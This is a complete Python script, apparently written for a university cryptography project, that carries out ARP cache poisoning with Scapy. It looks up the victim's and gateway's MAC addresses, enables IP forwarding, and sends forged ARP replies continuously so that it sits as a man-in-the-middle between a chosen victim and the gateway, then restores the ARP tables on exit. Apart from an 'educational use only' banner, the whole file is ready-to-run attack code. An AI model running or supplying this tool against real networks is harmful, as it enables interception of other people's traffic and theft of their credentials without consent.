#!/usr/bin/env python3
"""
ARP Spoofing Script
Realiza envenenamiento de caché ARP para posicionarse como MitM
"""

import sys
import time
import argparse
from scapy.all import ARP, Ether, send, srp, conf

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.live import Live
    from rich.table import Table
    console = Console()
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("⚠️  Instala 'rich' para mejor visualización: pip install rich")


class ARPSpoofer:
    def __init__(self, victim_ip, gateway_ip, interface='eth0'):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.victim_mac = None
        self.gateway_mac = None
        self.running = False
        
    def get_mac(self, ip):
        """Obtiene la dirección MAC de una IP"""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                        timeout=2, verbose=False, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            self.print_error(f"Error obteniendo MAC de {ip}: {e}")
        return None
    
    def enable_ip_forwarding(self):
        """Habilita IP forwarding para no romper la conexión"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            self.print_success("IP forwarding habilitado")
            return True
        except Exception as e:
            self.print_error(f"Error habilitando IP forwarding: {e}")
            return False
    
    def restore_arp(self):
        """Restaura las tablas ARP originales"""
        self.print_info("Restaurando tablas ARP...")
        
        if self.victim_mac and self.gateway_mac:
            # Enviar paquetes ARP correctos
            send(ARP(op=2, pdst=self.victim_ip, hwdst=self.victim_mac,
                    psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                count=5, verbose=False, iface=self.interface)
            
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                    psrc=self.victim_ip, hwsrc=self.victim_mac),
                count=5, verbose=False, iface=self.interface)
            
            self.print_success("Tablas ARP restauradas")
    
    def spoof(self):
        """Realiza el ARP spoofing"""
        # Obtener MACs
        self.print_info(f"Obteniendo MAC de víctima ({self.victim_ip})...")
        self.victim_mac = self.get_mac(self.victim_ip)
        
        if not self.victim_mac:
            self.print_error("No se pudo obtener MAC de la víctima")
            return False
        
        self.print_success(f"MAC víctima: {self.victim_mac}")
        
        self.print_info(f"Obteniendo MAC de gateway ({self.gateway_ip})...")
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.gateway_mac:
            self.print_error("No se pudo obtener MAC del gateway")
            return False
        
        self.print_success(f"MAC gateway: {self.gateway_mac}")
        
        # Habilitar IP forwarding
        if not self.enable_ip_forwarding():
            return False
        
        self.print_success("\n🎯 Iniciando ARP spoofing...")
        self.print_warning("Presiona Ctrl+C para detener\n")
        
        self.running = True
        packet_count = 0
        
        try:
            while self.running:
                # Envenenar víctima (decirle que somos el gateway)
                send(ARP(op=2, pdst=self.victim_ip, hwdst=self.victim_mac,
                        psrc=self.gateway_ip), verbose=False, iface=self.interface)
                
                # Envenenar gateway (decirle que somos la víctima)
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                        psrc=self.victim_ip), verbose=False, iface=self.interface)
                
                packet_count += 2
                
                if packet_count % 10 == 0:
                    self.print_info(f"Paquetes ARP enviados: {packet_count}")
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            self.print_warning("\n\n⚠️  Deteniendo ARP spoofing...")
            self.running = False
        
        # Restaurar ARP
        self.restore_arp()
        
        return True
    
    def print_info(self, message):
        if RICH_AVAILABLE:
            console.print(f"[blue]ℹ️  {message}[/blue]")
        else:
            print(f"ℹ️  {message}")
    
    def print_success(self, message):
        if RICH_AVAILABLE:
            console.print(f"[green]✅ {message}[/green]")
        else:
            print(f"✅ {message}")
    
    def print_error(self, message):
        if RICH_AVAILABLE:
            console.print(f"[red]❌ {message}[/red]")
        else:
            print(f"❌ {message}")
    
    def print_warning(self, message):
        if RICH_AVAILABLE:
            console.print(f"[yellow]⚠️  {message}[/yellow]")
        else:
            print(f"⚠️  {message}")


def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing Tool')
    parser.add_argument('-v', '--victim', required=True, help='Victim IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    parser.add_argument('-i', '--interface', default='eth0', help='Network interface')
    
    args = parser.parse_args()
    
    if RICH_AVAILABLE:
        console.print(Panel.fit(
            "[bold red]⚠️  ARP SPOOFING TOOL ⚠️[/bold red]\n"
            "[yellow]USO EDUCATIVO ÚNICAMENTE[/yellow]\n"
            "[dim]Proyecto de Criptografía - UNAL Medellín[/dim]",
            border_style="red"
        ))
    else:
        print("\n" + "="*60)
        print("⚠️  ARP SPOOFING TOOL ⚠️")
        print("USO EDUCATIVO ÚNICAMENTE")
        print("Proyecto de Criptografía - UNAL Medellín")
        print("="*60 + "\n")
    
    print(f"\nConfiguración:")
    print(f"  Víctima: {args.victim}")
    print(f"  Gateway: {args.gateway}")
    print(f"  Interfaz: {args.interface}")
    print()
    
    # Deshabilitar verbose de Scapy
    conf.verb = 0
    
    spoofer = ARPSpoofer(args.victim, args.gateway, args.interface)
    spoofer.spoof()


if __name__ == '__main__':
    main()
